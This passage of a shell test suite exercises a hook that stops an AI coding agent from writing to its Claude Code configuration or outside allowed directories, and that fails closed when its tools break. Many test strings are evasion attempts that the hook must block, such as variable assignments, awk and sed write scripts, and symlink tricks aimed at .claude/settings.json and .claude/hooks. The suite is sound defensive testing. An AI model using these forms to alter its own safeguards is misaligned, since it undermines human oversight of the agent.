    assert_each 0 '' "echo x 2>&1" "echo x >&-" "cat < ${TEST_TMP}/outside/f" "cat <<< x" "echo x > out.txt"
}

@test "an empty or missing command name is unclassified" {
    assert_each 2 '(empty command name) has no writer/read-only classification' "nice" "'' x"
}

@test "git with no subcommand writes nothing" {
    assert_each 0 '' "git --version" "git -C ."
}

@test "dotnet changelog --message is text in both spellings, for that call only" {
    assert_each 0 '' \
        "dotnet changelog -f CHANGELOG.md -a Fixed --message 'see ~/.claude/settings.json'" \
        "dotnet changelog -f CHANGELOG.md -a Fixed --message='see ~/.claude/settings.json'"
    assert_each 2 'writing to Claude Code configuration' "dotnet build --message ~/.claude/settings.json" \
        "dotnet changelog -f CHANGELOG.md -a Fixed -m x && dotnet build --message ~/.claude/settings.json"
}

@test "mktemp -t, a bare --tmpdir and no template write into TMPDIR, which must be under a root" {
    printf '%s\n' "${TEST_TMP}/repo" > "${HOOK_DIR}/allowed-dirs"
    assert_each 2 "implicit \$TMPDIR" "mktemp" "mktemp -t x.XXXXXX" "mktemp --tmpdir x.XXXXXX" "mktemp --tmp x.XXXXXX" \
        "mktemp -dt x.XXXXXX" "mktemp -t -p sub x.XXXXXX" "mktemp -p sub --tmpdir" "mktemp --tmpdir= x.XXXXXX" \
        "mktemp --suffix .txt" "mktemp --suf=.txt" "mktemp -p" "mktemp -p ''" "mktemp --quiet" "mktemp --=x"
    printf '%s\n' "${TEST_TMP}/repo" "${TMPDIR}" > "${HOOK_DIR}/allowed-dirs"
    assert_each 0 '' "mktemp" "mktemp -t x.XXXXXX" "mktemp --tmpdir x.XXXXXX" "mktemp --suffix .txt"
}

@test "a variable assignment anywhere in a command where mktemp uses TMPDIR blocks, since the hook checks its own TMPDIR" {
    assert_each 2 'in a command that assigns a variable' \
        "TMPDIR=.claude/hooks mktemp -t xXXXX" \
        "TMPDIR=.claude/skills mktemp -d" \
        "TMPDIR=../outside mktemp -d" \
        "TMPDIR=.claude/hooks; mktemp -t x" \
        "TMPDIR=.claude/hooks && mktemp -d" \
        "TMPDIR= mktemp -d" \
        "mktemp -d && TMPDIR=x" \
        "TMPDIR=x mktemp -t -p sub x.XXXXXX" \
        "TMPDIR=x mktemp --tmpdir x.XXXXXX" \
        "TMP=x mktemp"
    assert_each 0 '' "mktemp -d" "TMPDIR=x echo y" "TMPDIR=x mktemp -p sub" "TMPDIR=x mktemp --tmpdir=sub x.XXXXXX" \
        "TMPDIR=.claude/hooks mktemp sub/x.XXXX"
}

# The builtins below are unclassified in the shipped allowlist, which would block them on its own;
# classifying them here makes the variable-setting count the check under test.
@test "every way bash sets a variable counts as an assignment for mktemp and dotnet, not only NAME=value" {
    printf '%s\n' 'read read-only' 'mapfile read-only' 'readarray read-only' 'getopts read-only' 'unset read-only' \
        'wait read-only' ': read-only' 'source read-only' '. read-only' >> "${HOOK_DIR}/command-allowlist"
    assert_each 2 'in a command that assigns a variable' \
        "printf -v TMPDIR .claude/hooks; mktemp -d" \
        "printf -vTMPDIR .claude/hooks; mktemp -d" \
        "printf \"\$f\" x; mktemp -d" \
        "read TMPDIR <<< x; mktemp -d" \
        "IFS= read -r TMPDIR <<< x; mktemp -d" \
        "mapfile TMPDIR < f; mktemp -d" \
        "readarray TMPDIR < f; mktemp -d" \
        "getopts a TMPDIR; mktemp -d" \
        "unset TMPDIR; mktemp -d" \
        "wait -p TMPDIR; mktemp -d" \
        "source f; mktemp -d" \
        ". f; mktemp -d" \
        "export TMPDIR=.claude/hooks; mktemp -d" \
        "export TMPDIR; mktemp -d" \
        "declare -x TMPDIR=x; mktemp -d" \
        "typeset TMPDIR; mktemp -d" \
        "local TMPDIR=x; mktemp -d" \
        "readonly TMPDIR=x; mktemp -d" \
        "for TMPDIR in x; do mktemp -d; done" \
        "for ((i = 0; i < 1; i++)); do mktemp -d; done" \
        ": \${TMPDIR:=x}; mktemp -d" \
        ": \"\${TMPDIR=x}\"; mktemp -d" \
        "echo \$((TMPDIR = 5)); mktemp -d" \
        "echo \${a[x=1]}; mktemp -d" \
        "echo \${x:y=1}; mktemp -d" \
        "[[ 1 -eq TMPDIR=5 ]]; mktemp -d" \
        "[[ -v a[x=1] ]]; mktemp -d" \
        "[ -v 'a[x=1]' ]; mktemp -d" \
        "echo x {fd}> f; mktemp -d"
    assert_each 2 'MSBuild reads environment variables as properties' \
        "printf -v OutputPath x; dotnet build" \
        "let x=1; dotnet build" \
        "((x = 1)); dotnet build" \
        "read OutputPath <<< x; dotnet build"
    assert_each 0 '' "mktemp -d" "printf '%s' x; mktemp -d" "printf '%s' \"\${x}\"; mktemp -d" "echo \${x:-y}; mktemp -d" \
        "echo \${a[0]} \${a[@]} \${x:1:2}; mktemp -d" "[[ -f x ]] && mktemp -d" "[[ a == b ]] && mktemp -d" \
        "[ -f x ] && mktemp -d" "cd sub && mktemp -d" "dotnet build" "cd sub && dotnet build"
}

# As above, : is classified so the assignment check, not the missing classification, is what blocks.
@test "an assignment in a loop, arithmetic, +=, an array element, a group, a case branch or a substitution blocks mktemp and dotnet" {
    printf '%s\n' ': read-only' >> "${HOOK_DIR}/command-allowlist"
    local form forms=(
        "X=1;"
        "for X in a; do :; done;"
        "printf -v TMPDIR x;"
        ": \${TMPDIR:=x};"
        ": \${TMPDIR=x};"
        "(( X = 1 ));"
        "echo \$(( X = 1 ));"
        "X+=1;"
        "arr[0]=x;"
        "( X=1 );"
        "{ X=1; };"
        "case a in a) X=1 ;; esac;"
        "cat <<< \"\$(X=1)\";"
        "cat <(X=1);"
    )
    for form in "${forms[@]}"; do
        assert_each 2 'in a command that assigns a variable' "${form} mktemp -d" || return 1
        assert_each 2 'MSBuild reads environment variables as properties' "${form} dotnet build" || return 1
    done
    assert_each 0 '' "echo x; mktemp -d" "cd sub && mktemp -d" "echo x; dotnet build" "cd sub && dotnet build"
}

@test "a -v test blocks mktemp and dotnet, since a -v operand's array subscript is arithmetic that can assign" {
    local form
    for form in "[[ -v TMPDIR ]] &&" "[ -v TMPDIR ] &&" "test -v TMPDIR &&"; do
        assert_each 2 'in a command that assigns a variable' "${form} mktemp -d" || return 1
        assert_each 2 'MSBuild reads environment variables as properties' "${form} dotnet build" || return 1
    done
}

@test "a function definition assigns nothing, but an assignment, cd or write in its body is checked" {
    printf '%s\n' ': read-only' >> "${HOOK_DIR}/command-allowlist"
    mkdir -p "${TEST_TMP}/repo/.claude/hooks"
    assert_each 0 '' "f() { :; }; mktemp -d" "f() { :; }; dotnet build" "f() { echo; }; mktemp -d"
    assert_each 2 'in a command that assigns a variable' \
        "echo() { TMPDIR=.claude/hooks; }; echo; mktemp -d" \
        "echo() { export TMPDIR=.claude/hooks; }; echo; mktemp -d"
    assert_each 2 'MSBuild reads environment variables as properties' "echo() { OutputPath=.claude/hooks/; }; echo; dotnet build"
    assert_each_config_write \
        "echo() { cp x .claude/settings.json; }; echo" \
        "mktemp() { cp x .claude/settings.json; }; mktemp -d" \
        "echo() { cd .claude/hooks; }; echo; printf x > y" \
        "echo() { cd .claude/hooks; }; echo; mktemp -p . -d"
    assert_each 2 'outside the allowed directories' "echo() { cd ../outside; }; echo; mktemp -d x.XXXXXX"
    assert_each 2 'has no writer/read-only classification' "f() { TMPDIR=x; }; f; mktemp -d"
}

@test "mktemp -p DIR, -pDIR and --tmpdir=DIR write into DIR only, which must be under a root" {
    printf '%s\n' "${TEST_TMP}/repo" > "${HOOK_DIR}/allowed-dirs"
    assert_each 0 '' "mktemp -p sub" "mktemp -psub" "mktemp -dpsub" "mktemp --tmpdir=sub" "mktemp --t=sub" "mktemp --dry-run -p sub" \
        "mktemp -p sub x.XXXXXX" "mktemp -d --tmpdir=sub x.XXXXXX" "mktemp --tmpdir -p sub x.XXXXXX"
    assert_each 2 'outside the allowed directories' "mktemp -p ${TEST_TMP}/outside" \
        "mktemp --tmpdir=${TEST_TMP}/outside" "mktemp -p${TEST_TMP}/outside x.XXXXXX"
    assert_each_config_write "mktemp -p .claude" "mktemp --tmpdir=${HOME}/.claude/agents XXXX.md"
}

@test "an mktemp template containing / beside a directory option is blocked" {
    printf '%s\n' "${TEST_TMP}/repo" "${TMPDIR}" > "${HOOK_DIR}/allowed-dirs"
    assert_each 2 "contains '/' but is joined to a directory option" "mktemp -p sub ../x.XXXXXX" \
        "mktemp --tmpdir ../x.XXXXXX" "mktemp -t sub/x.XXXXXX" "mktemp --tmpdir=sub a/x.XXXXXX"
    assert_each 0 '' "mktemp sub/x.XXXXXX" "mktemp -d -- sub/x.XXXXXX"
}

@test "an mktemp word after -- is a template even when it starts with a dash" {
    printf '%s\n' "${TEST_TMP}/repo" > "${HOOK_DIR}/allowed-dirs"
    assert_each 0 '' "mktemp -d -- -x.XXXXXX" "mktemp -- -tx.XXXXXX" "mktemp -p sub -- -x.XXXXXX"
}

@test "ln option forms: --, long options, --target-directory (glued or separate), a missing -t/--target-directory directory, no or one operand" {
    assert_each 2 'outside the allowed directories' \
        "ln -s -- x ${TEST_TMP}/outside/link" \
        "ln --force -s x ${TEST_TMP}/outside/link" \
        "ln -s --target-directory=${TEST_TMP}/outside x" \
        "ln -s --target-directory ${TEST_TMP}/outside x" \
        "ln --symbolic -t ${TEST_TMP}/outside -- x"
    assert_each 2 'requires a directory' "ln -s x -t" "ln -s x --target-directory"
    assert_each 0 '' "ln -s" "ln -s ${TEST_TMP}/outside/x" "ln -s -- ${TEST_TMP}/outside/x link"
    run_hook_in_dir "ln -s x" "${TEST_TMP}/outside"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'implicit link in the working directory'* ]]
}

@test "sed script options: --expression in both spellings, a glued -e, and --file/-f/-l values are skipped" {
    assert_each 2 'writing to Claude Code configuration' \
        "sed --expression='w .claude/settings.json' x.txt" \
        "sed --expression 'w .claude/settings.json' x.txt" \
        "sed -e'w .claude/settings.json' x.txt"
    assert_each 2 'outside the allowed directories' \
        "sed --file=s.sed -i ${TEST_TMP}/outside/y" \
        "sed --file s.sed -i ${TEST_TMP}/outside/y" \
        "sed -f s.sed -i ${TEST_TMP}/outside/y" \
        "sed -fs.sed -i ${TEST_TMP}/outside/y"
    assert_each 0 '' \
        "sed -i -l 80 '/^#/d' f.txt" \
        "sed -i --line-length 80 '/^#/d' f.txt" \
        "sed -i --line-length=80 '/^#/d' f.txt"
}

@test "awk program sources: -f/-E/--file/--exec in every spelling make the first operand a file" {
    local opt
    for opt in "-f p.awk" "-E p.awk" "--file p.awk" "--exec p.awk" "-fp.awk" "--file=p.awk" "--exec=p.awk"; do
        assert_each 2 'outside the allowed directories' "awk ${opt} -i inplace ${TEST_TMP}/outside/x"
    done
}

@test "awk -e/--source program text and -v/--assign or name=value assignments are checked as text" {
    assert_each 2 'writing to Claude Code configuration' \
        "awk -e 'print > \".claude/settings.json\"' x" \
        "awk --source 'print > \".claude/settings.json\"' x" \
        "awk -e'print > \".claude/settings.json\"' x" \
        "awk --source='print > \".claude/settings.json\"' x" \
        "awk -v f=.claude/settings.json '{print > f}' x" \
        "awk --assign f=.claude/settings.json '{print > f}' x" \
        "awk -vf=.claude/settings.json '{print > f}' x" \
        "awk --assign=f=.claude/settings.json '{print > f}' x" \
        "awk '{print > f}' f=.claude/settings.json x"
    assert_each 0 '' "awk -v n=1 '{print n}' /etc/hosts" "awk '{print n}' n=1 /etc/hosts"
}

@test "awk --source= program text is quoted in the block message without the --source= prefix" {
    run_in_repo "awk --source='print > \".claude/settings.json\"' x"
    assert_blocked_config_write
    [[ "${output}" == *"('print > \".claude/settings.json\"')"* ]] || { echo "program not quoted as given: ${output}" >&2; return 1; }
    [[ "${output}" != *'--source='* ]] || { echo "message still carries the --source= prefix: ${output}" >&2; return 1; }
}

@test "awk -v/--assign glued assignment is quoted in the block message without the option prefix" {
    run_in_repo "awk -vx='.claude/settings.json' 'BEGIN{print 1 > x}'"
    assert_blocked_config_write
    [[ "${output}" == *"('x=.claude/settings.json')"* ]] || { echo "assignment not quoted as given: ${output}" >&2; return 1; }
    [[ "${output}" != *'-vx='* ]] || { echo "message still carries the -v prefix: ${output}" >&2; return 1; }

    run_in_repo "awk --assign=x='.claude/settings.json' 'BEGIN{print 1 > x}'"
    assert_blocked_config_write
    [[ "${output}" == *"('x=.claude/settings.json')"* ]] || { echo "assignment not quoted as given: ${output}" >&2; return 1; }
    [[ "${output}" != *'--assign='* ]] || { echo "message still carries the --assign= prefix: ${output}" >&2; return 1; }
}

@test "awk -l/--load/--include in every spelling makes the operands write targets, and -F and other options are skipped" {
    local opt
    for opt in "-l x" "--load x" "--include x" "-linplace" "--load=x" "--include=inplace" "-iinplace"; do
        assert_each 2 'outside the allowed directories' "awk ${opt} '{print}' ${TEST_TMP}/outside/x"
    done
    assert_each 0 '' "awk -i inplace -F x '/etc/' f.txt" "awk -F, '{print}' /etc/hosts"
    assert_each 2 'outside the allowed directories' "awk --posix -i inplace '{print}' ${TEST_TMP}/outside/x"
}

@test "an awk option outside the known non-writing set makes every argument a write target" {
    assert_each_config_write \
        "awk --dump-variables=.claude/settings.json 1 /dev/null" \
        "awk -d.claude/settings.json 1 /dev/null" \
        "awk -o.claude/hooks/x '{print}' /dev/null" \
        "awk --pretty-print=.claude/hooks/x '{print}' /dev/null" \
        "awk -p.claude/agents/x '{print}' /dev/null" \
        "awk --profile=.claude/skills/x '{print}' /dev/null" \
        "awk --inc inplace '{print}' .claude/settings.json" \
        "awk -W include=inplace '{print}' .claude/settings.json" \
        "awk -W dump-variables=.claude/settings.json 1 /dev/null"
    assert_each 2 'outside the allowed directories' "awk -D '{print}' ${TEST_TMP}/outside/x"
    assert_each 0 '' "awk --posix '{print}' /etc/hosts" "awk -P -F: '{print \$1}' /etc/passwd" "awk --field-separator=: '{print}' /etc/hosts"
}

@test "a bare - (standard input) is an awk operand, not an unknown option" {
    assert_each 0 '' "awk '/^x/ {print \$1}' -" "awk -i inplace '{print}' -"
    assert_each 2 'outside the allowed directories' "awk -i inplace '{print}' - ${TEST_TMP}/outside/x"
    assert_each_config_write "awk 'BEGIN{print 1 > \".claude/settings.json\"}' -"
}

# --- fail closed ------------------------------------------------------------

@test "an unrecognised tool_name is blocked (fail closed)" {
    run_payload '{"tool_name":"SomethingElse","tool_input":{"command":"ls"}}'
    [ "${status}" -eq 2 ]
    [[ "${output}" == *"unrecognised tool_name 'SomethingElse'"* ]]
}

@test "an empty Bash command runs nothing and is allowed" {
    run_payload '{"tool_name":"Bash","tool_input":{"command":""}}'
    [ "${status}" -eq 0 ]
}

@test "a payload that does not parse as JSON is blocked (fail closed)" {
    run_payload 'not json'
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'could not be parsed by jq'* ]]
}

@test "a failing jq is blocked (fail closed)" {
    make_stub jq 'exit 1'
    run_payload '{"tool_name":"Edit","tool_input":{"file_path":"/x"}}'
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'could not be parsed by jq'* ]]
}

@test "a failed analysis of the command's structure is blocked, not read as writing nothing (fail closed)" {
    local real_jq
    real_jq=$(command -v jq)
    make_stub jq "[ \"\$2\" = '--argjson' ] && exit 1; exec '${real_jq}' \"\$@\""
    run_in_repo "echo hi > out.txt"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'command structure could not be analyzed'* ]]
}

@test "a command shfmt cannot parse is blocked (fail closed)" {
    make_stub shfmt 'exit 1'
    run_in_repo "echo hi > out.txt"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'could not be parsed as shell'* ]]
}

@test "a path realpath cannot resolve, in either the logical or the physical mode, is blocked (fail closed)" {
    local real_realpath mode
    real_realpath=$(command -v realpath)
    for mode in -ms -m; do
        make_stub realpath "[ \"\$1\" = '${mode}' ] && exit 1; exec '${real_realpath}' \"\$@\""
        run_file_tool Edit "${TEST_TMP}/repo/src/Program.cs"
        [ "${status}" -eq 2 ] || { echo "realpath ${mode} failing was not blocked: ${output}" >&2; return 1; }
        [[ "${output}" == *'could not be resolved - failing closed'* ]]
    done
}

@test "a writer whose working directory realpath cannot resolve is blocked (fail closed)" {
    local real_realpath
    real_realpath=$(command -v realpath)
    make_stub realpath "[ \"\$1\" = '-m' ] && [ \"\$3\" = \"\$PWD\" ] && exit 1; exec '${real_realpath}' \"\$@\""
    run_in_repo "sed -n 'w out.txt' ${SRC}/payload"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'the working directory could not be resolved'* ]]
}

@test "glob matches realpath does not resolve one for one are blocked (fail closed)" {
    mkdir -p "${TEST_TMP}/repo/src"
    : > "${TEST_TMP}/repo/src/a.txt"
    : > "${TEST_TMP}/repo/src/b.txt"
    make_stub realpath 'exit 0'
    run_in_repo "sed -i 's/a/b/' src/*.txt"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'could not be resolved - failing closed'* ]]
}

@test "an unquoted glob over many ordinary files is allowed" {
    mkdir -p "${TEST_TMP}/repo/src"
    local i
    for i in 1 2 3 4 5; do : > "${TEST_TMP}/repo/src/f${i}.txt"; done
    run_in_repo "sed -i 's/a/b/' src/*.txt"
    [ "${status}" -eq 0 ]
}

# Commands whose bare - is a file name: deny by default, so each is checked as ./-, while the
# exceptions below are listed in dash_is_stream.
DASH_FILE_COMMANDS=(
    "tee -" "mkdir -" "mkdir -p -" "chmod 600 -" "dotnet build -o -" "dotnet new console -o -"
    "mktemp -p - x.XXXX" "sort -o - a" "sort -ro - a" "sort --output=- a" "sort --output - a"
    "sort --o - a" "sort -T - a" "sort -rT - a" "sort --temporary-directory - a" "sort --te - a"
    "touch -r - a" "uniq -f - a" "file -m - a" "curl -D - https://example.com"
    "curl -so - https://example.com" "openssl dgst -" "xmllint --schema - a.xml"
    "xmllint -relaxng - a.xml" "awk -d '{print}' -" "gh release download v1 -O -"
    "git clone https://github.com/x/y.git -" "git -C . checkout HEAD -" "git -C . checkout -b x -"
    "git -C . restore -" "python3 a.py -" "python3 -c x -" "python3 -ccode -" "python3 -mjson.tool -"
    "python3 -Bc x -" "python3 -X -" "python3 -W -" "python3 --check-hash-based-pycs -" "node - -"
    "node -r x -" "node --redirect-warnings -" "node --eval=x -" "bun run -" "bun --silent a.js -"
    "flake8 --output-file -" "flake8 --out -" "flake8 -j -" "flake8 -vq -"
)

# Commands whose bare - is standard input or output, or option text, so it is not a path.
DASH_STREAM_COMMANDS=(
    "sort a -" "sort -" "sort -s -" "sort -rs -" "sort -o out a -" "sort -t - -k2 a" "sort --field-sep - a"
    "sort --field-separator=, -" "sort -ok -" "sort -tX -"
    "sort --files0-from -" "uniq -" "uniq - -" "uniq a -" "touch -" "touch -c -" "file -"
    "file -f -" "file --files -" "file -F - a" "curl -o - https://example.com"
    "curl --output - https://example.com" "openssl base64 -in - -out -" "openssl base64 --in - --out -"
    "xmllint -" "xmllint -o - -" "xmllint --output - a.xml" "shfmt -" "shfmt -i 2 -"
    "git -C . checkout -" "git -C . checkout -q -" "awk '{print}' -"
    "python3 -" "python3 -B -" "python3 -I -" "python3 -Wignore -" "node -" "node --no-warnings -"
    "bun -" "bun --silent -" "flake8 -" "flake8 a.py -" "flake8 - -" "flake8 --count -"
    "flake8 --output-file out -" "flake8 --output-file=out -"
)

@test "a bare - is checked as the file ./- unless dash_is_stream lists it as stdin/stdout" {
    # From outside every root: in the ${SRC} cases only the - is outside, while the others also
    # name an outside operand, so the in-repo checks below are what isolate the -.
    assert_each_in_dir "${TEST_TMP}/outside" 2 'outside the allowed directories' \
        "tee -" "echo x | tee -a -" "mkdir -" "mkdir -p -" "chmod 600 -" "sort -o - ${SRC}/a" \
        "sort -ro - ${SRC}/a" "sort --output=- ${SRC}/a" "sort --output - ${SRC}/a" "sort --o - ${SRC}/a" \
        "sort -T - ${SRC}/a" "touch -r - ${SRC}/a" "dotnet build -o -" \
        "mktemp -p - x.XXXX" "git clone https://github.com/x/y.git -"
    # Inside the repo an ordinary ./- is allowed; a ./- linking into configuration is not, so
    # each of these shows the - itself is resolved, every other operand being inside the repo.
    assert_each 0 '' "${DASH_FILE_COMMANDS[@]}"
    mkdir -p "${TEST_TMP}/repo/.claude/agents"
    ln -s .claude/settings.json "${TEST_TMP}/repo/-"
    assert_each_config_write "${DASH_FILE_COMMANDS[@]}"
    rm "${TEST_TMP}/repo/-"
    ln -s .claude/agents "${TEST_TMP}/repo/-"
    assert_each_config_write "${DASH_FILE_COMMANDS[@]}"
}

@test "a bare - after a non-literal word is a file name" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    ln -s .claude/settings.json "${TEST_TMP}/repo/-"
    # dotnet changelog's -m value is text, skipped without being queued, so it is the one
    # non-literal word that can sit before the -; the - is then still checked as ./-.
    # shellcheck disable=SC2016  # literal $X - must reach the hook unexpanded
    assert_each_config_write 'dotnet changelog -m "$X" -'
    # Anywhere else a non-literal word before the - is queued itself and blocks first, so a
    # git checkout's - after one is never taken as the previous branch.
    # shellcheck disable=SC2016  # literal $X - must reach the hook unexpanded
    assert_each 2 'non-literal' 'git -C . checkout "$X" -' 'sort -t "$X" -' 'curl -o "$X" -'
}

@test "a bare - that is standard input or output is not a path" {
    assert_each_in_dir "${TEST_TMP}/outside" 0 '' \
        "sort ${SRC}/a -" "sort -" "sort -s -" "sort -o ${SRC}/out ${SRC}/a -" "sort --files0-from -" "touch -" \
        "uniq -" "uniq - -" "file -" "file -f -" "file -F - ${SRC}/a" "xmllint -" "xmllint -o - -" "shfmt -" \
        "python3 -" "node -" "bun -" "flake8 -"
    # Inside the repo a ./- linking into configuration shows none of these resolves its -.
    mkdir -p "${TEST_TMP}/repo/.claude/agents"
    ln -s .claude/settings.json "${TEST_TMP}/repo/-"
    assert_each 0 '' "${DASH_STREAM_COMMANDS[@]}"
    rm "${TEST_TMP}/repo/-"
    ln -s .claude/agents "${TEST_TMP}/repo/-"
    assert_each 0 '' "${DASH_STREAM_COMMANDS[@]}"
}

@test "a program read from stdin is not a path after a link-capable call" {
    # python3, node and bun read a bare - as their program, so a heredoc program run after an
    # ln -s or git checkout in the same command is not checked as the file ./-.
    assert_each 0 '' "ln -s a b && python3 -" "ln -s a b && node -" "ln -s a b && bun -" \
        "ln -s a b && flake8 -" "git -C . checkout main && python3 -"
}

@test "ln -t with a glued value starting with s is a hard link, not a symbolic one" {
    assert_each 2 'outside the allowed directories' "ln -tsub ${TEST_TMP}/outside/x"
    assert_each 0 '' "ln -stsub ${TEST_TMP}/outside/x"
}

@test "ln -S takes the rest of its word: an s after it is not -s, and a t after it is not -t" {
    assert_each_config_write "ln -Sxs .claude/settings.json evil" "ln -fSs .claude/settings.json evil" "ln -sSt x .claude/settings.json" \
        "ln -sf ${SRC}/payload .claude/settings.json -S .bak" "ln -sfS .bak ${SRC}/payload .claude/settings.json" \
        "ln -sf ${SRC}/payload .claude/settings.json --suffix .bak" "ln -sf ${SRC}/payload .claude/settings.json --suf .bak" \
        "ln -sf -S -tx ${SRC}/payload .claude/settings.json" "ln -sf --suffix -tx ${SRC}/payload .claude/settings.json" \
        "ln -sf -S --target-directory=x ${SRC}/payload .claude/settings.json" "ln -s -t x -t .claude/skills ${SRC}/payload"
    assert_each 0 '' "ln -sS.bak ${TEST_TMP}/outside/x link" "ln -s --suffix=.bak ${TEST_TMP}/outside/x link"
    # A separate-word -S/--suffix value is skipped, so the real link name is still the last operand.
    assert_each_config_write "ln -s -S .bak ${TEST_TMP}/outside/x .claude/settings.json" \
        "ln -s --suffix .bak ${TEST_TMP}/outside/x .claude/settings.json" \
        "ln -sf ${SRC}/payload .claude/settings.json --suffix=.bak"
    assert_each 0 '' "ln -s -S .bak ${TEST_TMP}/outside/x link" "ln -s --suffix .bak ${TEST_TMP}/outside/x link" \
        "ln -s ${TEST_TMP}/outside/x link --suffix=.bak"
    # cp/mv share the -t parser: a t inside a -S suffix is not -t, so no operand is taken as the
    # target directory.
    assert_each 0 '' "cp -Sxt a.txt b.txt" "mv -fSt a.txt b.txt"
}

# Builds a PATH directory holding only the named tools (plus cat, which reads the payload), so
# a hook run with that PATH finds every tool except the ones left out.
path_with_only() {
    local dir tool
    dir="${STUB_BIN}/only-$(IFS=-; printf '%s' "$*")"
    mkdir -p "${dir}"
    for tool in cat "$@"; do
        ln -sf "$(command -v "${tool}")" "${dir}/${tool}"
    done
    printf '%s' "${dir}"
}

run_payload_with_path() {
    run bash -c 'cd "$4" && printf "%s" "$1" | PATH="$2" "$(command -v bash)" "$3"' _ "$1" "$2" "${HOOK}" "${3:-${PWD}}"
}

@test "missing realpath is blocked for the file tools (fail closed)" {
    run_payload_with_path '{"tool_name":"Write","tool_input":{"file_path":"/x"}}' "$(path_with_only jq)"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'realpath is not available'* ]]
}

@test "missing shfmt or realpath is blocked for a Bash command (fail closed)" {
    run_payload_with_path '{"tool_input":{"command":"ls"}}' "$(path_with_only jq realpath)"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'shfmt is not available'* ]]
    run_payload_with_path '{"tool_input":{"command":"ls"}}' "$(path_with_only jq shfmt)"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'realpath is not available'* ]]
}

@test "a cd target whose logical or landing resolution fails is blocked (fail closed)" {
    local dir real
    dir="$(path_with_only jq shfmt base64)"
    real="$(command -v realpath)"
    # shellcheck disable=SC2016  # literal $1 - the stub script reads its own arguments
    printf '#!/bin/sh\n[ "$1" = "-ms" ] && exit 1\nexec %s "$@"\n' "${real}" > "${dir}/realpath"
    chmod +x "${dir}/realpath"
    run_payload_with_path '{"tool_input":{"command":"cd sub && ls"}}' "${dir}" "${TEST_TMP}/repo"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *"cd target 'sub' could not be resolved"* ]] || { echo "got: ${output}" >&2; return 1; }
    # Fails only the landing resolution, the one realpath -m call made on exactly <repo>/sub.
    # shellcheck disable=SC2016  # literal $1/$3 - the stub script reads its own arguments
    printf '#!/bin/sh\n[ "$1" = "-m" ] && [ "$3" = "%s" ] && exit 1\nexec %s "$@"\n' "${TEST_TMP}/repo/sub" "${real}" > "${dir}/realpath"
    run_payload_with_path '{"tool_input":{"command":"cd sub && ls"}}' "${dir}" "${TEST_TMP}/repo"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *"cd target 'sub' could not be resolved"* ]] || { echo "got: ${output}" >&2; return 1; }
}

@test "missing jq is blocked (fail closed)" {
    run_payload_with_path '{}' "$(path_with_only)"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'jq is not available'* ]]
}
